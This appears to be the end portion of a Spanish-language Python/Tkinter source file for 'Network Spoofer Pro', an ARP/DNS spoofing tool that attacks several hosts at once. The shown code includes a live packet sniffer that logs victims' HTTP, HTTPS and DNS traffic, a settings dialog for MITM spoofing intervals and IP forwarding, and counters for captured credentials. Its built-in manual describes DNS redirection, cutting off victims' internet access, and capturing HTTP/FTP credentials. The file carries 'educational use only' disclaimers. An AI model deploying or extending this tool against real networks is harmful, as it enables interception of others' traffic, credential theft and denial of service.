                      fg="white", selectcolor="#444", font=("Consolas", 9)).pack(side=tk.LEFT, padx=5)
        tk.Checkbutton(frame_filtros, text="DNS", variable=var_dns, bg="#1e1e1e",
                      fg="white", selectcolor="#444", font=("Consolas", 9)).pack(side=tk.LEFT, padx=5)
        tk.Checkbutton(frame_filtros, text="HTTPS", variable=var_https, bg="#1e1e1e",
                      fg="white", selectcolor="#444", font=("Consolas", 9)).pack(side=tk.LEFT, padx=5)
        
        log_trafico = scrolledtext.ScrolledText(ventana_monitor, bg="#111", fg="#00ff88",
                                               font=("Consolas", 9))
        log_trafico.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def monitor_paquete(pkt):
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            
            if pkt.haslayer(IP):
                ip_src = pkt[IP].src
                ip_dst = pkt[IP].dst
                
                if pkt.haslayer(TCP):
                    puerto = pkt[TCP].dport
                    if puerto == 80 and var_http.get():
                        log_trafico.insert(tk.END, f"[{timestamp}] HTTP: {ip_src} → {ip_dst}\n")
                    elif puerto == 443 and var_https.get():
                        log_trafico.insert(tk.END, f"[{timestamp}] HTTPS: {ip_src} → {ip_dst}\n")
                elif pkt.haslayer(UDP) and pkt[UDP].dport == 53 and var_dns.get():
                    if pkt.haslayer(DNS):
                        dominio = pkt[DNS].qd.qname.decode() if pkt[DNS].qr == 0 else ""
                        log_trafico.insert(tk.END, f"[{timestamp}] DNS Query: {ip_src} → {dominio}\n")
                
                log_trafico.yview(tk.END)
                
                # Limitar tamaño del log
                if int(log_trafico.index('end-1c').split('.')[0]) > 1000:
                    log_trafico.delete('1.0', '100.0')
        
        def iniciar_monitor():
            sniff(prn=monitor_paquete, store=0)
        
        threading.Thread(target=iniciar_monitor, daemon=True).start()
        log_trafico.insert(tk.END, "[~] Monitor de tráfico iniciado...\n\n")
    
    def abrir_configuracion(self):
        """Abrir ventana de configuración avanzada"""
        ventana_config = Toplevel(self.root)
        ventana_config.title("Configuración Avanzada")
        ventana_config.geometry("600x400")
        ventana_config.config(bg="#1e1e1e")
        
        tk.Label(ventana_config, text="Configuración Avanzada",
                bg="#1e1e1e", fg="white", font=("Consolas", 12, "bold")).pack(pady=20)
        
        frame_config = tk.Frame(ventana_config, bg="#1e1e1e")
        frame_config.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)
        
        # Intervalo de ARP spoofing
        tk.Label(frame_config, text="Intervalo ARP Spoofing (segundos):",
                bg="#1e1e1e", fg="white", font=("Consolas", 10)).grid(row=0, column=0, sticky="w", pady=10)
        entry_intervalo = tk.Entry(frame_config, bg="#2a2a2a", fg="#00ff88",
                                  font=("Consolas", 10), width=10)
        entry_intervalo.insert(0, "2")
        entry_intervalo.grid(row=0, column=1, padx=10)
        
        # IP forwarding
        var_forwarding = tk.BooleanVar(value=True)
        tk.Checkbutton(frame_config, text="Habilitar IP Forwarding (necesario para MITM)",
                      variable=var_forwarding, bg="#1e1e1e", fg="white",
                      selectcolor="#444", font=("Consolas", 10)).grid(row=1, column=0, columnspan=2, sticky="w", pady=10)
        
        tk.Label(frame_config, text="Funcionalidades en desarrollo...",
                bg="#1e1e1e", fg="gray", font=("Consolas", 10, "italic")).grid(row=2, column=0, columnspan=2, pady=20)
        
        tk.Button(ventana_config, text="Cerrar", command=ventana_config.destroy,
                 bg="#444", fg="white", font=("Consolas", 10),
                 activebackground="#555", relief=tk.FLAT, padx=20, pady=8).pack(pady=20)
    
    # ===== Funciones de interfaz =====
    
    def actualizar_hosts_seleccionados(self):
        """Actualizar lista de hosts seleccionados en el tab de ataque"""
        if not hasattr(self, 'text_hosts_seleccionados') or self.text_hosts_seleccionados is None:
            return
            
        self.text_hosts_seleccionados.config(state='normal')
        self.text_hosts_seleccionados.delete("1.0", tk.END)
        
        if not self.hosts_objetivos:
            self.text_hosts_seleccionados.insert("1.0", "No hay hosts bajo ataque actualmente.\n")
        else:
            self.text_hosts_seleccionados.insert("1.0", f"Hosts bajo ataque: {len(self.hosts_objetivos)}\n\n")
            for ip, host in self.hosts_objetivos.items():
                estado = "🟢 Activo" if host.activo else "🔴 Inactivo"
                self.text_hosts_seleccionados.insert(tk.END,
                    f"{estado} | {ip} ({host.mac})\n"
                    f"   Paquetes ARP: {host.paquetes_enviados} | DNS interceptados: {host.paquetes_interceptados}\n\n")
        
        self.text_hosts_seleccionados.config(state='disabled')
        
        # Actualizar contador en barra de estado
        if self.label_hosts_activos:
            self.label_hosts_activos.config(text=f"Hosts activos: {len([h for h in self.hosts_objetivos.values() if h.activo])}")
        if self.label_paquetes:
            self.label_paquetes.config(text=f"Paquetes: {self.estadisticas['paquetes_arp'] + self.estadisticas['paquetes_dns']}")
    
    def actualizar_estadisticas(self):
        """Actualizar la vista de estadísticas"""
        if not hasattr(self, 'label_stats_general') or not self.label_stats_general:
            return
            
        # Estadísticas generales
        total_arp = self.estadisticas['paquetes_arp']
        total_dns = self.estadisticas['paquetes_dns']
        total_creds = self.estadisticas['credenciales_capturadas']
        hosts_activos = len([h for h in self.hosts_objetivos.values() if h.activo])
        
        texto_general = f"""
Hosts activos: {hosts_activos}
Total de hosts objetivo: {len(self.hosts_objetivos)}
Paquetes ARP enviados: {total_arp}
Paquetes DNS interceptados: {total_dns}
Credenciales capturadas: {total_creds}
Dominios spoofead os: {len(self.dominios_falsos)}
        """
        self.label_stats_general.config(text=texto_general)
        
        # Estadísticas por host
        if not hasattr(self, 'text_stats_hosts') or not self.text_stats_hosts:
            return
            
        self.text_stats_hosts.delete("1.0", tk.END)
        if self.hosts_objetivos:
            for ip, host in self.hosts_objetivos.items():
                estado = "🟢 ACTIVO" if host.activo else "🔴 INACTIVO"
                ultima = host.ultima_actividad.strftime("%H:%M:%S") if host.ultima_actividad else "N/A"
                
                self.text_stats_hosts.insert(tk.END,
                    f"{'='*60}\n"
                    f"Host: {ip} ({host.mac})\n"
                    f"Estado: {estado}\n"
                    f"Paquetes ARP enviados: {host.paquetes_enviados}\n"
                    f"Paquetes DNS interceptados: {host.paquetes_interceptados}\n"
                    f"Última actividad: {ultima}\n\n")
        else:
            self.text_stats_hosts.insert("1.0", "No hay hosts bajo ataque actualmente.")
    
    def actualizar_estadisticas_periodico(self):
        """Actualizar estadísticas automáticamente"""
        if hasattr(self, 'text_stats_hosts') and self.text_stats_hosts:
            self.actualizar_estadisticas()
            self.actualizar_hosts_seleccionados()
        self.root.after(2000, self.actualizar_estadisticas_periodico)
    
    def actualizar_estado(self, texto, color):
        """Actualizar etiqueta de estado"""
        if self.label_estado:
            self.label_estado.config(text=texto, fg=color)
    
    def log_output(self, texto):
        """Agregar texto al log"""
        if not self.log_text:
            print(texto)  # Fallback a stdout si log_text no existe aún
            return
            
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.config(state='normal')
        self.log_text.insert(tk.END, f"[{timestamp}] {texto}\n")
        self.log_text.yview(tk.END)
        self.log_text.config(state='disabled')
    
    def limpiar_logs(self):
        """Limpiar el área de logs"""
        self.log_text.config(state='normal')
        self.log_text.delete("1.0", tk.END)
        self.log_text.config(state='disabled')
        self.log_output("Logs limpiados")
    
    def guardar_log(self):
        """Guardar logs en un archivo"""
        archivo = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Archivos de texto", "*.txt"), ("Todos los archivos", "*.*")],
            title="Guardar log"
        )
        
        if archivo:
            try:
                with open(archivo, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get("1.0", tk.END))
                messagebox.showinfo("Éxito", f"Log guardado en:\n{archivo}")
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo guardar el log:\n{e}")
    
    def exportar_estadisticas(self):
        """Exportar estadísticas a JSON"""
        archivo = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("Archivos JSON", "*.json"), ("Todos los archivos", "*.*")],
            title="Exportar estadísticas"
        )
        
        if archivo:
            try:
                datos = {
                    "timestamp": datetime.now().isoformat(),
                    "estadisticas_generales": dict(self.estadisticas),
                    "hosts": {
                        ip: {
                            "mac": host.mac,
                            "activo": host.activo,
                            "paquetes_enviados": host.paquetes_enviados,
                            "paquetes_interceptados": host.paquetes_interceptados,
                            "ultima_actividad": host.ultima_actividad.isoformat() if host.ultima_actividad else None
                        }
                        for ip, host in self.hosts_objetivos.items()
                    }
                }
                
                with open(archivo, 'w', encoding='utf-8') as f:
                    json.dump(datos, f, indent=2, ensure_ascii=False)
                
                messagebox.showinfo("Éxito", f"Estadísticas exportadas a:\n{archivo}")
            except Exception as e:
                messagebox.showerror("Error", f"No se pudieron exportar las estadísticas:\n{e}")
    
    def mostrar_ayuda(self):
        """Mostrar manual de uso"""
        ventana_ayuda = Toplevel(self.root)
        ventana_ayuda.title("Manual de Uso")
        ventana_ayuda.geometry("700x500")
        ventana_ayuda.config(bg="#1e1e1e")
        
        texto_ayuda = scrolledtext.ScrolledText(ventana_ayuda, bg="#2a2a2a", fg="white",
                                               font=("Consolas", 10), wrap=tk.WORD)
        texto_ayuda.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        manual = """
═══════════════════════════════════════════════════════════════════
                    NETWORK SPOOFER PRO - MANUAL DE USO
═══════════════════════════════════════════════════════════════════

ADVERTENCIA: Esta herramienta es solo para fines educativos y pruebas
de penetración autorizadas. El uso no autorizado puede ser ilegal.

═══════════════════════════════════════════════════════════════════
1. ESCANEO DE RED
═══════════════════════════════════════════════════════════════════
   - Haz clic en "Escanear Red" para detectar hosts en tu red local
   - Selecciona los hosts objetivo usando los checkboxes
   - Puedes seleccionar múltiples hosts simultáneamente

═══════════════════════════════════════════════════════════════════
2. CONFIGURACIÓN DE ATAQUE
═══════════════════════════════════════════════════════════════════
   - Ve al tab "Ataque Multi-Host"
   - Introduce los dominios que quieres spoofear (uno por línea)
   - Especifica la IP de redirección (o usa tu propia IP)
   - Los hosts seleccionados aparecerán en el panel inferior

═══════════════════════════════════════════════════════════════════
3. TIPOS DE ATAQUE
═══════════════════════════════════════════════════════════════════
   A) ARP/DNS Spoofing:
      - Intercepta y modifica consultas DNS
      - Redirige tráfico a tu IP o IP especificada
      
   B) Bloqueo de Internet:
      - Impide que los hosts accedan a internet
      - Útil para pruebas de disponibilidad

═══════════════════════════════════════════════════════════════════
4. HERRAMIENTAS ADICIONALES
═══════════════════════════════════════════════════════════════════
   - Interceptor de Credenciales: Captura credenciales HTTP/FTP
   - Monitor de Tráfico: Visualiza tráfico en tiempo real
   - Estadísticas: Monitorea el rendimiento del ataque

═══════════════════════════════════════════════════════════════════
5. MEJORES PRÁCTICAS
═══════════════════════════════════════════════════════════════════
   - Usa en redes de prueba o con autorización explícita
   - Detén el ataque correctamente para restaurar ARP
   - Revisa logs y estadísticas regularmente
   - Exporta datos para análisis posterior

═══════════════════════════════════════════════════════════════════
6. SOLUCIÓN DE PROBLEMAS
═══════════════════════════════════════════════════════════════════
   - Si no detecta hosts: Verifica permisos de administrador
   - Si ARP no funciona: Revisa IP forwarding en el sistema
   - Para mejor rendimiento: Limita número de hosts simultáneos

═══════════════════════════════════════════════════════════════════
Desarrollado con fines educativos | Python + Scapy + Tkinter
═══════════════════════════════════════════════════════════════════
        """
        
        texto_ayuda.insert("1.0", manual)
        texto_ayuda.config(state='disabled')
    
    def mostrar_acerca_de(self):
        """Mostrar información sobre la aplicación"""
        messagebox.showinfo(
            "Acerca de Network Spoofer Pro",
            "Network Spoofer Pro v2.0\n"
            "Herramienta educativa de ARP/DNS Spoofing\n\n"
            "Características:\n"
            "• Ataque multi-host simultáneo\n"
            "• DNS Spoofing avanzado\n"
            "• Interceptación de credenciales\n"
            "• Monitor de tráfico en tiempo real\n"
            "• Estadísticas detalladas\n\n"
            "Desarrollado en Python con:\n"
            "• Scapy (manipulación de paquetes)\n"
            "• Tkinter (interfaz gráfica)\n"
            "• Threading (multi-procesamiento)\n\n"
            "⚠️ SOLO PARA FINES EDUCATIVOS ⚠️\n"
            "Uso no autorizado es ilegal"
        )
    
    def salir_aplicacion(self):
        """Salir de la aplicación de forma segura"""
        if self.hosts_objetivos:
            respuesta = messagebox.askyesno(
                "Advertencia",
                "Hay ataques activos. ¿Deseas detenerlos antes de salir?"
            )
            if respuesta:
                self.detener_ataque_multihost()
        
        self.root.quit()


class RedirectText(io.StringIO):
    """Clase para redirigir stdout/stderr al widget de texto"""
    def __init__(self, callback):
        super().__init__()
        self.callback = callback
    
    def write(self, s):
        if s.strip():
            self.callback(s.strip())


# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Banner de inicio
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║           NETWORK SPOOFER PRO - Multi-Host Edition           ║
    ║                                                              ║
    ║              ⚠️  SOLO PARA FINES EDUCATIVOS  ⚠️               ║
    ║                                                              ║
    ║  Herramienta de ARP/DNS Spoofing para pruebas de seguridad  ║
    ║           El uso no autorizado puede ser ilegal              ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Verificar permisos de administrador
    import os
    if os.geteuid() != 0:
        print("\n[!] ADVERTENCIA: Esta herramienta requiere permisos de administrador")
        print("[!] Ejecuta con: sudo python3 network_spoofer_pro.py\n")
    
    # Iniciar aplicación
    root = tk.Tk()
    app = NetworkSpooferPro(root)
    root.mainloop()
